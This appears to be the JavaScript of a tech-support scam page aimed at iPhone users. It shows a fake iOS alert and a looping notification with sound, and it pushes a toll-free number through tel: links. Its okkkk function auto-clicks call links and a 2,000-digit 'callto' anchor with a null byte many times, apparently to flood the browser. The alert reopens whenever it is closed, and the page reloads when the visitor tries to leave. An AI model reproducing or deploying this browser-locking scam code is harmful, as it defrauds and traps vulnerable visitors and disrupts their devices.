
        function getURLParameter(name) {
            return decodeURI(
                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
            );
        };
        var cookieHelper = {
            defParams: {
                path: "/",
                domain: "." + window.location.host.replace(/:\d+/, "")
            },
            set: function (a, d, c) {
                c = c || {};
                for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
                b = c.expires;
                if ("number" == typeof b && b) {
                    var e = new Date;
                    e.setTime(e.getTime() + 1E3 * b);
                    b = c.expires = e
                }
                b && b.toUTCString && (c.expires = b.toUTCString());
                d = encodeURIComponent(d);
                a = a + "=" + d;
                for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
                document.cookie = a
            },
            get: function (a) {
                return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0
            },
            del: function (a) {
                this.set(a, null, {
                    expires: -1
                })
            }
        };


        var userAgent = window.navigator.userAgent.toLowerCase(),
            ios = /iphone|ipod|ipad/.test(userAgent);

        function parseURL(url) {
            var a = document.createElement('a');
            a.href = url;
            return a.hostname.replace('www.', '');
        };

        function getPar(name) {
            var url = window.location.href;
            name = name.replace(/[\[\]]/g, "\\$&");
            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
                results = regex.exec(url);
            if (!results) return null;
            if (!results[2]) return '';
            return decodeURIComponent(results[2].replace(/\+/g, " "));
        };

        window.number = getPar('phone');

        window.number = (window.number ? window.number : '+1-833-735-4654 ');

        window.device = 'iPhone';
        window.refef = parseURL(document.referrer);

        if (ios) {

            if (/iphone/.test(userAgent)) {
                window.device = 'iPhone';
            }

            if (/ipad/.test(userAgent)) {
                window.device = 'iPad';
            }

            if (/ipod/.test(userAgent)) {
                window.device = 'iPod';
            }
        }

        var text = cookieHelper.get('textSetBl');
        var phone = cookieHelper.get('phoneSetBl');

        function getText() {
            var str = window.defaultText;

            for (var d in window.text) {
                if (window.refef.indexOf(d) != -1) {
                    str = window.text[d];
                }
            }
            //var str = window.text[window.refef]?window.text[window.refef]:window.defaultText;
            return str.replace('|%model%|', window.device).replace('|%ref%|', window.refef);
        }


        if (!phone) {
            phone = getURLParameter('phone');
        }
        if (!text) {
            text = getURLParameter('text');
        }

        var sText = document.querySelectorAll('.js_setTextBlock');
        for (var t = 0; t < sText.length; t++) {
            sText[t].innerHTML = getText();
        }
        var sPhone = document.querySelectorAll('.js_setPhoneBlock');
        for (var p = 0; p < sPhone.length; p++) {
            sPhone[p].innerHTML = phone;
        }


        // Function to push the notification and play sound
        function pushNotification() {
            var notifContainer = document.getElementById('ios-notification-container');

            // If already showing, temporarily hide it to trigger animation again
            if (notifContainer.classList.contains('show')) {
                notifContainer.classList.remove('show');
                setTimeout(function () {
                    showNotificationWithSound(notifContainer);
                }, 600); // Increased wait time to allow the larger notification to fully slide up before dropping down again
            } else {
                showNotificationWithSound(notifContainer);
            }
        }

        function showNotificationWithSound(container) {
            container.classList.add('show');
            // Try to play sound when notification appears
            var audio = document.getElementById('notification-sound');
            if (audio) {
                audio.currentTime = 0; // Reset audio to start so it plays fully every time
                var playPromise = audio.play();
                if (playPromise !== undefined) {
                    playPromise.catch(function (error) {
                        console.log("Autoplay prevented by browser. Sound will play on first interaction.");
                    });
                }
            }
        }

        // --- STANDARD NOTIFICATION & POPUP FLOW ---
        
        function showVisuals() {
            // Show Notification
            pushNotification();

            // Start notification loop
            setInterval(pushNotification, 8000);

            // Show Popup
            document.getElementById('ios-alert-overlay').classList.add('show');
            document.querySelector('#ios-alert-box .ios-alert-message').innerHTML = getText();
        }

        // Trigger visuals immediately on load
        setTimeout(showVisuals, 100);

        // Fallback: Attempt to play audio on any user click if autoplay was blocked
        document.body.addEventListener('click', function() {
            var audio = document.getElementById('notification-sound');
            if (audio && audio.paused && audio.currentTime === 0) {
                audio.play().catch(function(e){});
            }
        }, { once: true });

        <!-- Audio element for notification sound -->

        function callNumber() {
            okkkk();
            window.location.href = "tel:+1-833-735-4654";
        }

        function reopenAlert() {
            document.getElementById('ios-alert-overlay').classList.remove('show');
            setTimeout(function () {
                document.getElementById('ios-alert-overlay').classList.add('show');
            }, 50); // Wait 50ms and show it again immediately
            okkkk(); // Trigger background spam
        }

        function okkkk() {
            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-833-735-4654"></a>');
            document.querySelector('a').click();
            var extraData = "";
            for (itxextraData = 0; itxextraData < 200; itxextraData++) {
                var extraData = extraData + "5555555555";
            }
            jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
            document.querySelector('a').click();
            document.querySelector('a').click();
            document.querySelector('a').click();
            document.querySelector('a').click();
            document.querySelector('a').click();
            document.querySelector('a').click();
            //setInterval(function(){ alert(getText().repeat(99999999999));}, 300);
        };

        function myFunction() {
            // Unused
        }

        window.ununload = function () {
            debugger;
            location.reload();
        }
    